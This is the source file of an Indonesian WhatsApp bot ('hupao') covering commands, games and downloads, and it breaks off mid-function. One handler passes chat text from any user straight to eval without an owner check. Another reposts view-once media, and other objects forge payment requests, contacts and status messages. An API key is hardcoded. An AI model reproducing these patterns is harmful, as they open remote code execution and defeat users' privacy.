//=================================================//
require('./tao.js')
require('./lib/taomenu.js')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const os = require('os')
const axios = require('axios')
const speed = require('performance-now')
const FormData = require('form-data')
const fsx = require('fs-extra')
const crypto = require('crypto')
const cheerio = require('cheerio');
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const path = require('path')
const im = require('imagemagick')
const { JSDOM } = require('jsdom')
const { uptotelegra } = require('./lib/upload.js')
const { generateProfilePicture } = require('./lib/myfunc.js')
const tiktok = require('./lib/tiktok2.js')
const youtube = require("yt-search");
const ytdl = require("ytdl-core")
const dylux = require(`api-dylux`)
const fb = require('boedzhanks-fbdownload')
const saucenao = require("sagiri");
const saucenaoapi = saucenao("074a1f1a40e94436de37232d4e9f9d70afcdb90e");
const { ndown, twitterdown, GDLink, capcut, alldown } = require("nayan-media-downloader")
const { exec, spawn, execSync } = require("child_process")
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, fetchBuffer, jsonformat, format, parseMention, getRandom,formatp, getGroupAdmins, timeWait } = require('./lib/myfunc.js')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const db_user = JSON.parse(fs.readFileSync('./database/user.json'))
//=================================================/

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
users: {},
chats: {},
game: {},
database: {},
settings: {},
setting: {},
others: {},
sticker: {},
    ...(global.db.data || {})
}

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let antilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));

const yts = require('./scrape/yt-search/dist/yt-search.js')
const { ytSearch } = require('./scrape/yt.js')
const { remini } = require('./base/remini.js')
const thumbnail = fs.readFileSync ('./base/image/mamak.jpg')
const thumb = fs.readFileSync ('./base/image/mamak.jpg')
const kalimage = fs.readFileSync ('./base/image/mamak.jpg')
//let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const owner = JSON.parse(fs.readFileSync('./owner.json'))
const { TelegraPH } = require("./lib/TelegraPH.js")
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
let antilink2 = JSON.parse(fs.readFileSync('./database/antilink2.json'));
const antiviewonce = JSON.parse(fs.readFileSync('./lib/antiviewonce.json'));
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const gcmute = JSON.parse(fs.readFileSync("./lib/mute.json"))
const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))
const banned = JSON.parse(fs.readFileSync('./base/dbnye/banned.json'))
const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./database/register.js')
const { stubFalse, result } = require('lodash')
const { errorMonitor } = require('events')
const isRegistered = checkRegisteredUser(m.sender)
//=================================================//
module.exports = hupao = async (hupao, m, chatUpdate, setting, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix

//=================================================//

const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = m.key.remoteJid
const botNumber = await hupao.decodeJid(hupao.user.id)
const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await hupao.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const isAntiLink2 = antilink2.includes(m.chat) ? true : false
const isAntiViewOnce = antiviewonce.includes(m.chat) ? true : false
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) :''
const prem = JSON.parse(fs.readFileSync('./base/dbnye/premium.json'))
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false
const groupMute = m.isGroup ? gcmute.includes(from) : false 
const autodelete = from && isCmd ? antidel.includes(from) : false 
const isBan = banned.includes(m.sender)
const isUser = pengguna.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const jam = moment().format("HH:mm:ss z")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'ᴘᴀɢɪ' ? dt + '🌄' : dt == 'sɪᴀɴɢ' ? dt + '🏜️' : dt == 'sᴏʀᴇ' ? dt + '🌇' : dt + '🌆'
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)
const qtod = m.quoted? "true":"false"
const isPrem = prem.includes(m.sender)
const isOwner = owner.includes(m.sender)
//=================================================//}
const cap = 'Boedzhanks'
const kalgans = { 
key: {
fromMe: [], 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) 
},

'message': {
	"interactiveMessage": {
						"header": {
						
							"hasMediaAttachment": [],
							"jpegThumbnail": thumb,
													},
						"nativeFlowMessage": {
							"buttons": [
								{
									"name": "review_and_pay",
									"buttonParamsJson": "{\"currency\":\"IDR\",\"external_payment_configurations\":[{\"uri\":\"\",\"type\":\"payment_instruction\",\"payment_instruction\":\"hey ini test\"}],\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":2500000,\"offset\":100},\"reference_id\":\"4MX98934S0D\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":2500000,\"offset\":100},\"items\":[{\"retailer_id\":\"6283129109022\",\"product_id\":\"685731947500\",\"name\":\"Boedzhanks\",\"amount\":{\"value\":2500000,\"offset\":100},\"quantity\":1}]}}"
								}
							]
			}
}}}
//=================================================


const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}
const reply = (teks) => {
return hupao.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ by Boedzhanks `,"body": `Selamat ${ucapanWaktu} kak ${pushname}`, mediaType: 1, renderLargerThumbnail: true, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/984ec7737ca62fc16e87e.jpg',"thumbnail": thumb,"sourceUrl": `https://chat.whatsapp.com/Lhw9jBIZnBDF7wkEcwyZ1D`}}}, { quoted:m})} 

const errorReply = (teks) => {
        return hupao.sendMessage(from, {text: teks,  contextInfo: {
            document: fs.readFileSync("./package.json"),
            filename: `hupao`,
            mimetype: 'application/pdf',
	fileLength: 99999999999999999999999999999999999999,
    pageCount: 10909143,	
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `Hai kak ${pushname}👋`,
                        body: `𝙀 𝙍 𝙍 𝙊 𝙍 🙃`,
                        previewType: "PHOTO",
                        thumbnail: thum,
                        sourceUrl: saluran                    }
                }}, {quoted: m})}
     async function replyMsg(teks) {
            const prince = {
                contextInfo: {
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `𝖠 𝖪 𝖲 𝖤 𝖲 𝖣 𝖨 𝖳 𝖮 𝖫 𝖠 𝖪 ❌`,
                        body: ``,
                        previewType: "PHOTO",
                        thumbnail: thum,
                        sourceUrl: ``
                    }
                },
                text: teks
            };
            return hupao.sendMessage(m.chat, prince, {
                quoted: ftroli
            });
        };
const vidReply = (teks) => {
 return hupao.sendMessage(from, { video: vidmenu, gifPlayback: true, caption: `${text}`, contextInfo:{ externalAdReply: {
title:`hupao`,
body: `${jam}`,
thumbnail: thum,
renderLargerThumbnail: true,
sourceUrl: `https://wa.me/6283129109022`,
}}}, { quoted: m })}

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2024,status: 200, thumbnail: thum, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thum}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": ofc,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': good}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": ofc, "caption": `${pushname}`, 'jpegThumbnail': thum}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": ofc,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': good}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: ofc,jpegThumbnail: thum}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Hupao By Boedzhanks`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Boedzhanks,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/984ec7737ca62fc16e87e.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log('Download Audio With ytdl-core')
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await hupao.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}
//=================================================
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log('Download Video With ytdl-core')
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await hupao.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}
//=================================================
async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}
     
async function loading () {
var taoo = [
    "█▒▒▒▒▒▒▒▒▒▒▒ 10%",
    "████▒▒▒▒▒▒▒▒ 30%",
    "███████▒▒▒▒▒ 50%",
    "██████████▒▒ 80%",
    "████████████ 100%",
 'Loading Completed!\n\nTunggu Sebentar'
]
let { key } = await hupao.sendMessage(from, {text: 'Loading...'})//Awalan

for (let i = 0; i < taoo.length; i++) {
/*await delay(10)*/
await hupao.sendMessage(from, {text: taoo[i], edit: key });//setelah nya
}
}
if (autodelete) {
hupao.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: mek.key.id,
participant: mek.key.participant
}
})
}
//=================================================
/*let reactionMessage = {
                    react: {
                        text: `👁️‍🗨️`,
                        key: { remoteJid: m.chat, fromMe: true, id: mek.key.id }
                    }
                }
                await sleep(1500)
                hupao.sendMessage(m.chat, reactionMessage)*/
//=================================================//

     
if (!hupao.public) {
if (!m.key.fromMe) return
}
/*if (setting.autobio){
if (setting.autobio === false) return
let settingstatus = 0;
if (new Date() * 1 - settingstatus > 1000) {
await hupao.setStatus(`I'm Hupao 🤖 | ${runtime(process.uptime())} ⏰ | Status : ${hupao.mode ? "Public Mode" : "Self Mode"} | 1.3k Users`)
settingstatus = new dt() * 1
}
     }*/
let rn = ['composing']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
hupao.sendPresenceUpdate(jd, from)
console.log('[ PESAN ] ' + (new Date) + (budy || m.mtype) + '\n' + '=> Dari ' + (pushname) + (m.sender) + '\n' + '=> Di ' + (m.isGroup ? pushname : 'Private Chat', from))
}
if (isCmd && !isUser) {
pengguna.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pengguna, null, 2))
}
// Anti Link
if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await hupao.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return hupao.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return hupao.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return hupao.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\nOwner telah mengirim link, owner bebas memposting link apa pun`})
if (isOwner) return hupao.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\nOwner telah mengirim link, owner bebas memposting link apa pun`})
await hupao.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
hupao.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:hw})
}
}
//Anti View Once
if ( isAntiViewOnce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
    if (m.isBaileys && m.fromMe) return
    let val = { ...m }
    let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
    delete msg[Object.keys(msg)[0]].viewOnce
    val.message = msg
    await hupao.sendMessage(m.chat, { forward: val }, { quoted: m })
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: hupao.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, hupao.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
hupao.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await hupao.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const sendapk = (teks) => {
hupao.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
m.reply('*Rusak Om !! Yang Bener Contoh : Yoapk Boedzhanks*')
}
for (let ikalii of apknye) {
if (budy === ikalii) {
let buffer = fs.readFileSync(`./database/apk/${ikalii}.apk`)
sendapk(buffer)
}
}
//=================================================//
const sendzip = (teks) => {
hupao.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
m.reply('*Rusak Om !! Yang Bener Contoh : Yozip Boedzhanks*')
}
for (let ikali of zipnye) {
if (budy === ikali) {
let buffer = fs.readFileSync(`./database/zip/${ikali}.zip`)
sendzip(buffer)
}
}
//=================================================//
const senddocu = (teks) => {
hupao.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
m.reply('*Rusak Om !! Yang Bener Contoh : Yopdf Boedzhanks*')
}
for (let ikal of docunye) {
if (budy === ikal) {
let buffer = fs.readFileSync(`./database/Docu/${ikal}.pdf`)
senddocu(buffer)
}
}
const sendvn = (teks) => {
hupao.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, {quoted:m})
}

for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}
//=================================================//
var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await hupao.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
}
//=================================================//
if (('family100'+from in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
hupao.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   hupao.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 hupao.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 hupao.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 hupao.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 hupao.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 hupao.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 hupao.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await hupao.sendText(room.x, str, m, { mentions: parseMention(str) } )
await hupao.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
